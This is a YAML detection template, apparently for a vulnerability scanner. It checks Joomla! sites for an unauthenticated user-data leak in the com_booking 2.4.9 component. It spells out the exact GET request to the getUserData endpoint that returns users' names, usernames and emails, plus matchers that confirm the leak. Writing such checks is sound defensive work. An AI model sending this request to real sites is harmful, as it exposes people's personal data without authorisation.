id: "joomla-com-booking-component"
name: "Joomla! com_booking component 2.4.9 - Information Leak"
severity: "high"
description: "Joomla! com_booking component suffers from Information leak vulnerability in which sensitive or confidential data is unintentionally exposed or made accessible to unauthorized individuals or systems."
tech:
  - "php"
tags:
  - "joomla"
  - "info-leak"
  - "unauth"
  - "vuln"
reference: "https://www.exploit-db.com/exploits/51595"
spaExclusion: true
request:
  method: "GET"
  path: "/index.php?option=com_booking&controller=customer&task=getUserData&id=123"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "\"name\":"
      - "\"username\":"
      - "\"email\":"
    condition: "and"
  - type: "regex"
    part: "body"
    regex:
      - "^{.*}$"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
